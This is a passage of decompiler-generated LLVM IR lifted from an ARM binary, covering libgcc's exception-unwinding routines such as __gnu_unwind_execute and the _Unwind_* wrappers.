  uselistorder i32* @sb, { 74, 11, 12, 13, 14, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 42, 30, 31, 32, 1, 33, 43, 44, 45, 46, 47, 48, 49, 50, 51, 57, 58, 4, 5, 6, 75, 76, 59, 60, 61, 62, 63, 64, 65, 15, 16, 17, 18, 7, 8, 34, 35, 36, 37, 38, 39, 40, 41, 52, 55, 53, 54, 56, 2, 9, 10, 66, 67, 68, 69, 70, 71, 72, 0, 73, 3 }
  uselistorder i32 36, { 23, 22, 6, 4, 11, 12, 15, 16, 17, 18, 19, 13, 7, 10, 8, 24, 1, 5, 14, 9, 0, 2, 3, 20, 21 }
  uselistorder i32* @r8, { 167, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 3, 166, 41, 42, 43, 44, 45, 46, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 68, 74, 88, 89, 94, 99, 100, 101, 4, 102, 103, 104, 105, 106, 120, 20, 21, 22, 168, 169, 121, 122, 123, 124, 125, 126, 127, 128, 129, 0, 130, 131, 47, 48, 49, 50, 23, 24, 25, 144, 145, 146, 147, 148, 9, 26, 27, 28, 14, 15, 5, 16, 69, 70, 6, 71, 72, 73, 107, 108, 109, 110, 111, 8, 112, 113, 114, 115, 116, 117, 118, 119, 33, 34, 35, 36, 95, 96, 97, 98, 90, 91, 92, 93, 10, 11, 29, 30, 31, 32, 75, 76, 77, 78, 132, 133, 134, 135, 136, 137, 138, 2, 139, 1, 140, 141, 142, 143, 17, 18, 79, 80, 81, 82, 83, 84, 85, 86, 87, 12, 62, 7, 63, 64, 65, 66, 67, 37, 38, 39, 40, 13, 19 }
  uselistorder i32 32, { 92, 27, 89, 90, 91, 67, 68, 69, 70, 20, 21, 29, 42, 43, 23, 24, 71, 22, 30, 72, 73, 74, 75, 28, 76, 48, 50, 51, 62, 63, 32, 65, 52, 53, 44, 45, 93, 38, 94, 19, 37, 95, 13, 49, 66, 31, 25, 77, 33, 15, 78, 79, 34, 1, 2, 39, 40, 96, 54, 55, 35, 56, 57, 3, 4, 6, 5, 64, 26, 60, 58, 59, 80, 81, 14, 82, 0, 36, 83, 84, 85, 86, 87, 88, 16, 46, 47, 61, 8, 7, 10, 9, 17, 18, 12, 11, 41 }
  uselistorder i32 28, { 51, 24, 4, 7, 26, 5, 29, 6, 30, 35, 37, 38, 8, 39, 9, 36, 10, 11, 31, 41, 25, 12, 18, 13, 52, 19, 53, 54, 55, 56, 23, 40, 14, 1, 42, 15, 20, 16, 2, 21, 27, 28, 3, 32, 33, 43, 44, 45, 46, 47, 48, 49, 0, 50, 22, 34, 17 }
  uselistorder i32 24, { 49, 48, 19, 23, 25, 26, 0, 36, 4, 38, 27, 28, 10, 11, 50, 5, 6, 51, 24, 37, 1, 31, 32, 33, 20, 21, 39, 7, 22, 12, 13, 14, 3, 8, 15, 16, 18, 29, 30, 2, 34, 40, 41, 42, 43, 44, 45, 46, 47, 17, 35, 9 }
  uselistorder i32 20, { 55, 53, 54, 56, 2, 6, 11, 7, 36, 37, 3, 9, 42, 0, 45, 38, 39, 18, 19, 57, 20, 58, 59, 60, 35, 61, 10, 62, 63, 4, 64, 43, 12, 46, 47, 32, 33, 34, 21, 13, 22, 23, 1, 65, 14, 52, 25, 26, 27, 28, 29, 30, 31, 15, 40, 41, 5, 8, 48, 49, 50, 51, 24, 44, 16, 17 }
  uselistorder i32* @r1, { 316, 23, 24, 25, 4, 317, 235, 236, 22, 237, 238, 239, 240, 241, 26, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 63, 64, 27, 65, 66, 253, 5, 254, 255, 256, 257, 258, 259, 260, 21, 261, 262, 263, 264, 318, 319, 28, 107, 108, 110, 111, 112, 127, 29, 30, 37, 128, 129, 130, 320, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 148, 149, 150, 151, 152, 153, 157, 159, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 203, 204, 6, 207, 208, 209, 210, 17, 67, 68, 211, 213, 212, 31, 214, 215, 216, 217, 218, 219, 160, 161, 265, 71, 73, 69, 2, 322, 70, 321, 124, 125, 220, 221, 223, 229, 230, 231, 232, 233, 75, 32, 113, 1, 114, 115, 33, 323, 34, 266, 267, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 8, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 7, 365, 366, 35, 162, 167, 168, 169, 116, 117, 118, 119, 120, 121, 268, 270, 271, 38, 272, 273, 274, 275, 276, 277, 278, 284, 285, 279, 280, 281, 282, 39, 286, 9, 287, 40, 126, 3, 122, 123, 41, 72, 74, 48, 367, 368, 369, 42, 371, 372, 373, 374, 288, 43, 53, 375, 44, 54, 62, 370, 146, 147, 222, 10, 154, 155, 11, 156, 205, 12, 206, 102, 200, 234, 173, 174, 175, 45, 109, 46, 289, 290, 291, 47, 224, 225, 226, 227, 228, 13, 201, 202, 18, 310, 311, 158, 14, 55, 56, 57, 58, 59, 60, 61, 15, 376, 377, 378, 379, 0, 380, 52, 36, 292, 16, 293, 294, 49, 163, 164, 165, 166, 76, 77, 78, 170, 171, 172, 79, 80, 81, 82, 295, 296, 297, 19, 299, 300, 301, 302, 303, 304, 305, 306, 307, 50, 298, 20, 283, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 308, 83, 309, 145, 84, 85, 269, 51, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 103, 104, 105, 106, 312, 313, 314, 315 }
  uselistorder i32 60, { 2, 27, 28, 29, 25, 26, 3, 17, 18, 4, 5, 1, 6, 7, 0, 21, 22, 13, 14, 23, 24, 15, 16, 8, 11, 12, 9, 19, 20, 10 }
  uselistorder i32 56, { 3, 38, 39, 35, 36, 37, 21, 22, 8, 9, 1, 4, 18, 19, 20, 7, 0, 5, 27, 28, 29, 30, 12, 13, 14, 31, 32, 33, 15, 16, 17, 11, 10, 2, 34, 23, 24, 25, 26, 6 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19164 = load i32, i32* @r0, align 4
  ret i32 %v1_19164
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1916c = load i32, i32* @r0, align 4
  ret i32 %v1_1916c
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19180 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19184 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19180, i32 0)
  ret i32 %v2_19184

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_191a4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_191a8 = call i32 @__gnu_Unwind_Resume(i32 %v2_191a4, i32 0)
  ret i32 %v2_191a8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_191c8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_191cc = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_191c8, i32 0)
  ret i32 %v2_191cc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_191ec = ptrtoint i32* %stack_var_-68 to i32
  %v6_191f0 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_191ec, i32 %arg2, i8* %arg3, i32 %v2_191ec)
  ret i32 %v6_191f0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1921c = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19224 = add i32 %tmp1, 76
  %v2_19224 = inttoptr i32 %v1_19224 to i32*
  %v3_19224 = load i32, i32* %v2_19224, align 4
  %v1_19228 = add i32 %v3_19224, 7
  %v2_19228 = inttoptr i32 %v1_19228 to i8*
  %v3_19228 = load i8, i8* %v2_19228, align 1
  %v4_19228 = zext i8 %v3_19228 to i32
  %v1_1922c = add i32 %v3_19224, 8
  %v3_19230 = mul nuw nsw i32 %v4_19228, 4
  %v2_19234 = add i32 %v3_19230, %v1_1922c
  %v3_19234 = inttoptr i32 %v2_19234 to i8*
  ret i8* %v3_19234
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_19244 = load i32, i32* @r6, align 4
  %v21_19244 = load i32, i32* @lr, align 4
  %v0_19248 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19248, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_19258

dec_label_pc_19258:                               ; preds = %dec_label_pc_19258.backedge, %entry
  %v3_19264 = phi i32 [ %v0_19258.pre, %dec_label_pc_19258.backedge ], [ %tmp, %entry ]
  %v1_19258 = add i32 %v3_19264, 8
  %v2_19258 = inttoptr i32 %v1_19258 to i8*
  %v3_19258 = load i8, i8* %v2_19258, align 1
  %v4_19258 = zext i8 %v3_19258 to i32
  store i32 %v4_19258, i32* %r3.global-to-local, align 4
  %v2_1925c = icmp eq i8 %v3_19258, 0
  store i1 %v2_1925c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1925c, label %dec_label_pc_1926c, label %.thread

.thread:                                          ; preds = %dec_label_pc_19258
  %v2_19260 = add nsw i32 %v4_19258, -1
  store i32 %v2_19260, i32* %r3.global-to-local, align 4
  %v2_19264 = trunc i32 %v2_19260 to i8
  store i8 %v2_19264, i8* %v2_19258, align 1
  %v0_19268.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19268.pr.pr, label %.thread.dec_label_pc_1926c_crit_edge, label %dec_label_pc_19294

.thread.dec_label_pc_1926c_crit_edge:             ; preds = %.thread
  %v0_1926c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1926c

dec_label_pc_1926c:                               ; preds = %.thread.dec_label_pc_1926c_crit_edge, %dec_label_pc_19258
  %v0_1926c = phi i32 [ %v0_1926c.pre, %.thread.dec_label_pc_1926c_crit_edge ], [ %v3_19264, %dec_label_pc_19258 ]
  %v1_1926c = add i32 %v0_1926c, 9
  %v2_1926c = inttoptr i32 %v1_1926c to i8*
  %v3_1926c = load i8, i8* %v2_1926c, align 1
  %v4_1926c = zext i8 %v3_1926c to i32
  store i32 %v4_1926c, i32* %r3.global-to-local, align 4
  %v2_19270 = icmp eq i8 %v3_1926c, 0
  store i1 %v2_19270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19270, label %dec_label_pc_19374, label %dec_label_pc_19278

dec_label_pc_19278:                               ; preds = %dec_label_pc_19368, %dec_label_pc_1926c
  %v2_1927c = phi i32 [ %v0_19368, %dec_label_pc_19368 ], [ %v0_1926c, %dec_label_pc_1926c ]
  %v0_19278 = phi i32 [ %v4_19368, %dec_label_pc_19368 ], [ %v4_1926c, %dec_label_pc_1926c ]
  %v1_19278 = add nsw i32 %v0_19278, -1
  store i32 %v1_19278, i32* %r3.global-to-local, align 4
  %v1_1927c = trunc i32 %v1_19278 to i8
  %v3_1927c = add i32 %v2_1927c, 9
  %v4_1927c = inttoptr i32 %v3_1927c to i8*
  store i8 %v1_1927c, i8* %v4_1927c, align 1
  %v0_19280 = load i32, i32* @r5, align 4
  %v1_19280 = add i32 %v0_19280, 4
  %v2_19280 = inttoptr i32 %v1_19280 to i32*
  %v3_19280 = load i32, i32* %v2_19280, align 4
  store i32 %v3_19280, i32* %r2.global-to-local, align 4
  %v1_19284 = inttoptr i32 %v3_19280 to i32*
  %v2_19284 = load i32, i32* %v1_19284, align 4
  store i32 %v2_19284, i32* %r0.global-to-local, align 4
  %v4_19284 = add i32 %v3_19280, 4
  store i32 %v4_19284, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1928c = inttoptr i32 %v0_19280 to i32*
  store i32 %v2_19284, i32* %v1_1928c, align 4
  %v5_1928c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1928c, i32* %v2_19280, align 4
  %v0_19290 = load i32, i32* %r3.global-to-local, align 4
  %v1_19290 = trunc i32 %v0_19290 to i8
  %v2_19290 = load i32, i32* @r5, align 4
  %v3_19290 = add i32 %v2_19290, 8
  %v4_19290 = inttoptr i32 %v3_19290 to i8*
  store i8 %v1_19290, i8* %v4_19290, align 1
  br label %dec_label_pc_19294

dec_label_pc_19294:                               ; preds = %.thread, %dec_label_pc_19278, %.thread6
  %v0_19294 = load i32, i32* @r5, align 4
  %v1_19294 = inttoptr i32 %v0_19294 to i32*
  %v2_19294 = load i32, i32* %v1_19294, align 4
  %v3_19298 = udiv i32 %v2_19294, 16777216
  store i32 %v3_19298, i32* @r4, align 4
  store i32 %v3_19298, i32* %ip.global-to-local, align 4
  %v3_192a0 = mul i32 %v2_19294, 256
  store i32 %v3_192a0, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19294, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_192a0, i32* %v1_19294, align 4
  br i1 %tmp183, label %dec_label_pc_19374, label %dec_label_pc_192b0

dec_label_pc_192b0:                               ; preds = %dec_label_pc_19294
  %v0_192b0 = load i32, i32* @r4, align 4
  %v1_192b0 = and i32 %v0_192b0, 128
  store i32 %v1_192b0, i32* %r1.global-to-local, align 4
  %v2_192b0 = icmp eq i32 %v1_192b0, 0
  store i1 %v2_192b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192b0, label %dec_label_pc_1938c, label %dec_label_pc_192b8

dec_label_pc_192b8:                               ; preds = %dec_label_pc_192b0
  %v1_192b8 = and i32 %v0_192b0, 240
  store i32 %v1_192b8, i32* @r6, align 4
  %v7_192bc = icmp eq i32 %v1_192b8, 128
  store i1 %v7_192bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_192bc, label %dec_label_pc_192c4, label %dec_label_pc_193e8

dec_label_pc_192c4:                               ; preds = %dec_label_pc_192b8
  %v0_192c4 = load i32, i32* @r5, align 4
  %v1_192c4 = add i32 %v0_192c4, 8
  %v2_192c4 = inttoptr i32 %v1_192c4 to i8*
  %v3_192c4 = load i8, i8* %v2_192c4, align 1
  %v4_192c4 = zext i8 %v3_192c4 to i32
  store i32 %v4_192c4, i32* %r3.global-to-local, align 4
  %v2_192c8 = icmp eq i8 %v3_192c4, 0
  store i1 %v2_192c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192c8, label %dec_label_pc_192d8, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_192c4
  %v2_192cc = add nsw i32 %v4_192c4, -1
  store i32 %v2_192cc, i32* %r3.global-to-local, align 4
  %v2_192d0 = trunc i32 %v2_192cc to i8
  store i8 %v2_192d0, i8* %v2_192c4, align 1
  %v0_192d4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_192d4.pr.pr, label %.thread3.dec_label_pc_192d8_crit_edge, label %dec_label_pc_19308

.thread3.dec_label_pc_192d8_crit_edge:            ; preds = %.thread3
  %v0_192d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192d8

dec_label_pc_192d8:                               ; preds = %.thread3.dec_label_pc_192d8_crit_edge, %dec_label_pc_192c4
  %v2_192ec = phi i32 [ %v0_192d8.pre, %.thread3.dec_label_pc_192d8_crit_edge ], [ %v0_192c4, %dec_label_pc_192c4 ]
  %v1_192d8 = add i32 %v2_192ec, 9
  %v2_192d8 = inttoptr i32 %v1_192d8 to i8*
  %v3_192d8 = load i8, i8* %v2_192d8, align 1
  %v4_192d8 = zext i8 %v3_192d8 to i32
  store i32 %v4_192d8, i32* %r3.global-to-local, align 4
  %v2_192dc = icmp eq i8 %v3_192d8, 0
  store i1 %v2_192dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192dc, label %dec_label_pc_19318, label %dec_label_pc_192e8

dec_label_pc_192e8:                               ; preds = %dec_label_pc_192d8
  %v1_192e8 = add nsw i32 %v4_192d8, -1
  store i32 %v1_192e8, i32* %r3.global-to-local, align 4
  %v1_192ec = trunc i32 %v1_192e8 to i8
  store i8 %v1_192ec, i8* %v2_192d8, align 1
  %v0_192f0 = load i32, i32* @r5, align 4
  %v1_192f0 = add i32 %v0_192f0, 4
  %v2_192f0 = inttoptr i32 %v1_192f0 to i32*
  %v3_192f0 = load i32, i32* %v2_192f0, align 4
  store i32 %v3_192f0, i32* %r2.global-to-local, align 4
  %v1_192f4 = inttoptr i32 %v3_192f0 to i32*
  %v2_192f4 = load i32, i32* %v1_192f4, align 4
  store i32 %v2_192f4, i32* %r0.global-to-local, align 4
  %v4_192f4 = add i32 %v3_192f0, 4
  store i32 %v4_192f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_192f4, i32* %v2_192f0, align 4
  %v0_19300 = load i32, i32* %r3.global-to-local, align 4
  %v1_19300 = trunc i32 %v0_19300 to i8
  %v2_19300 = load i32, i32* @r5, align 4
  %v3_19300 = add i32 %v2_19300, 8
  %v4_19300 = inttoptr i32 %v3_19300 to i8*
  store i8 %v1_19300, i8* %v4_19300, align 1
  %v0_19304 = load i32, i32* %r0.global-to-local, align 4
  %v1_19304 = load i32, i32* @r5, align 4
  %v2_19304 = inttoptr i32 %v1_19304 to i32*
  store i32 %v0_19304, i32* %v2_19304, align 4
  br label %dec_label_pc_19308

dec_label_pc_19308:                               ; preds = %.thread3, %dec_label_pc_192e8
  %v0_19308 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19308, i32* %r3.global-to-local, align 4
  %v3_1930c = mul i32 %v0_19308, 256
  store i32 %v3_1930c, i32* %r0.global-to-local, align 4
  %v1_19310 = load i32, i32* @r5, align 4
  %v2_19310 = inttoptr i32 %v1_19310 to i32*
  store i32 %v3_1930c, i32* %v2_19310, align 4
  %v0_19314 = load i32, i32* %r3.global-to-local, align 4
  %v3_19314 = udiv i32 %v0_19314, 16777216
  br label %dec_label_pc_19318

dec_label_pc_19318:                               ; preds = %dec_label_pc_192d8, %dec_label_pc_19308
  %storemerge133 = phi i32 [ %v3_19314, %dec_label_pc_19308 ], [ 176, %dec_label_pc_192d8 ]
  %v1_19318 = load i32, i32* %ip.global-to-local, align 4
  %v4_19318 = mul i32 %v1_19318, 256
  %v5_19318 = or i32 %v4_19318, %storemerge133
  store i32 %v5_19318, i32* %r2.global-to-local, align 4
  %v7_1931c = icmp eq i32 %v5_19318, 32768
  store i1 %v7_1931c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1931c, label %dec_label_pc_19528, label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_19318
  %v3_19324 = mul i32 %v5_19318, 16
  store i32 %v3_19324, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_19334 = and i32 %v3_19324, 65520
  store i32 %v3_19334, i32* %r2.global-to-local, align 4
  %v0_19338 = load i32, i32* @r7, align 4
  store i32 %v0_19338, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_19340 = call i32 @_Unwind_VRS_Pop(i32 %v0_19338, i32 %v3_19334, i32 0, i32 0)
  store i32 %v4_19340, i32* %r0.global-to-local, align 4
  %v2_19344 = icmp eq i32 %v4_19340, 0
  store i1 %v2_19344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19344, label %dec_label_pc_1934c, label %dec_label_pc_19528

dec_label_pc_1934c:                               ; preds = %dec_label_pc_19324
  %v0_1934c = load i32, i32* @r5, align 4
  %v1_1934c = add i32 %v0_1934c, 8
  %v2_1934c = inttoptr i32 %v1_1934c to i8*
  %v3_1934c = load i8, i8* %v2_1934c, align 1
  %v4_1934c = zext i8 %v3_1934c to i32
  store i32 %v4_1934c, i32* %r3.global-to-local, align 4
  %v0_19350 = load i32, i32* @r4, align 4
  %v1_19350 = and i32 %v0_19350, 32768
  %v2_19350 = icmp eq i32 %v1_19350, 0
  store i1 %v2_19350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19350, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1934c
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1934c, %bb147
  %v2_19358 = icmp eq i8 %v3_1934c, 0
  store i1 %v2_19358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19358, label %dec_label_pc_19368, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1935c = add nsw i32 %v4_1934c, -1
  store i32 %v2_1935c, i32* %r3.global-to-local, align 4
  %v2_19360 = trunc i32 %v2_1935c to i8
  store i8 %v2_19360, i8* %v2_1934c, align 1
  %v0_19364.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19364.pr.pr, label %.thread6.dec_label_pc_19368_crit_edge, label %dec_label_pc_19294

.thread6.dec_label_pc_19368_crit_edge:            ; preds = %.thread6
  %v0_19368.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19368

dec_label_pc_19368:                               ; preds = %bb148, %.thread6.dec_label_pc_19368_crit_edge
  %v0_19368 = phi i32 [ %v0_19368.pre, %.thread6.dec_label_pc_19368_crit_edge ], [ %v0_1934c, %bb148 ]
  %v1_19368 = add i32 %v0_19368, 9
  %v2_19368 = inttoptr i32 %v1_19368 to i8*
  %v3_19368 = load i8, i8* %v2_19368, align 1
  %v4_19368 = zext i8 %v3_19368 to i32
  store i32 %v4_19368, i32* %r3.global-to-local, align 4
  %v2_1936c = icmp eq i8 %v3_19368, 0
  store i1 %v2_1936c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1936c, label %dec_label_pc_19374, label %dec_label_pc_19278

dec_label_pc_19374:                               ; preds = %dec_label_pc_19368, %dec_label_pc_1926c, %dec_label_pc_19294
  %v0_19374 = load i32, i32* @sl, align 4
  %v2_19374 = icmp eq i32 %v0_19374, 0
  store i1 %v2_19374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19374, label %dec_label_pc_1943c, label %bb149

bb149:                                            ; preds = %dec_label_pc_19374
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19380

dec_label_pc_19380:                               ; preds = %bb149, %dec_label_pc_198f0, %dec_label_pc_19790, %dec_label_pc_195b4, %dec_label_pc_1956c, %dec_label_pc_19528, %dec_label_pc_1943c
  %v1_19388 = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_198f0 ], [ 9, %dec_label_pc_19790 ], [ 9, %dec_label_pc_195b4 ], [ 9, %dec_label_pc_1956c ], [ 9, %dec_label_pc_19528 ], [ %v0_19470, %dec_label_pc_1943c ]
  store i32 %v9_19244, i32* %r6.global-to-local, align 4
  store i32 %v21_19244, i32* @lr, align 4
  ret i32 %v1_19388

dec_label_pc_1938c:                               ; preds = %dec_label_pc_192b0
  %v1_1938c = mul i32 %v0_192b0, 4
  %v3_19390 = and i32 %v1_1938c, 252
  store i32 %v3_19390, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1939c = load i32, i32* @r7, align 4
  store i32 %v0_1939c, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_193a4 = add nuw nsw i32 %v3_19390, 4
  store i32 %v1_193a4, i32* %r6.global-to-local, align 4
  %v5_193ac = call i32 @_Unwind_VRS_Get(i32 %v0_1939c, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_193b0 = load i32, i32* @r4, align 4
  %v1_193b0 = and i32 %v0_193b0, 64
  %v2_193b0 = icmp eq i32 %v1_193b0, 0
  store i1 %v2_193b0, i1* %cpsr_z.global-to-local, align 1
  %v4_193b8 = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_193c4 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_193c4
  %storemerge160.p = select i1 %v2_193b0, i32 %v2_193c4, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_193b8
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_193e0 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_193e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19258.backedge

dec_label_pc_19258.backedge:                      ; preds = %dec_label_pc_1938c, %dec_label_pc_19408, %dec_label_pc_1988c, %dec_label_pc_19558, %dec_label_pc_19590, %dec_label_pc_19510, %dec_label_pc_1977c
  %v0_19258.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19258

dec_label_pc_193e8:                               ; preds = %dec_label_pc_192b8
  %v7_193e8 = icmp eq i32 %v1_192b8, 144
  store i1 %v7_193e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_193e8, label %dec_label_pc_193f0, label %dec_label_pc_19530

dec_label_pc_193f0:                               ; preds = %dec_label_pc_193e8
  %v1_193f0 = urem i32 %v0_192b0, 16
  store i32 %v1_193f0, i32* %r2.global-to-local, align 4
  %v2_193f4 = icmp eq i32 %v1_193f0, 15
  store i1 %v2_193f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193f4, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_193f0
  %v8_193f8 = icmp eq i32 %v1_193f0, 13
  store i1 %v8_193f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_193f8, label %bb154, label %dec_label_pc_19408

.thread21:                                        ; preds = %dec_label_pc_193f0
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19528

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19528

dec_label_pc_19408:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19414 = load i32, i32* @r7, align 4
  store i32 %v0_19414, i32* %r0.global-to-local, align 4
  %v5_1941c = call i32 @_Unwind_VRS_Get(i32 %v0_19414, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19424 = load i32, i32* @r7, align 4
  store i32 %v0_19424, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_19434 = call i32 @_Unwind_VRS_Set(i32 %v0_19424, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19258.backedge

dec_label_pc_1943c:                               ; preds = %dec_label_pc_19374
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1944c = load i32, i32* @r7, align 4
  store i32 %v0_1944c, i32* %r0.global-to-local, align 4
  %v7_19454 = call i32 @_Unwind_VRS_Get(i32 %v0_1944c, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_19458 = load i32, i32* @r7, align 4
  store i32 %v0_19458, i32* %r0.global-to-local, align 4
  %v0_1945c = load i32, i32* @sl, align 4
  store i32 %v0_1945c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1945c, i32* %r3.global-to-local, align 4
  %v5_1946c = call i32 @_Unwind_VRS_Set(i32 %v0_19458, i32 %v0_1945c, i32 15, i32 %v0_1945c, i8* bitcast (i32* @0 to i8*))
  %v0_19470 = load i32, i32* @sl, align 4
  store i32 %v0_19470, i32* %r0.global-to-local, align 4
